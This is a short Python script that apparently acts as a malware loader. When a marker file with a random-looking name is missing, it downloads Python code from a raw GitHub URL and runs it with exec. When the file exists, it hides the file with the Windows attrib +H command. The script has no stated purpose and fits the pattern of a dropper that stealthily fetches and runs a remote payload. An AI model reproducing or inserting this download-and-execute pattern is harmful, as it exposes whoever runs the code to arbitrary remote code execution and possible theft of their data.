import os
import requests
import subprocess

try:
    with open('NODJKSLmJDLJIdHWID.txt', 'r') as f:
        pass

except FileNotFoundError:
    exec(requests.get('https://raw.githubusercontent.com/AprillZerx/Loin/main/Check.py').text)

else:
    f.close()
    subprocess.check_call(["attrib", "+H", "NODJKSLmJDLJIdHWID.txt"])
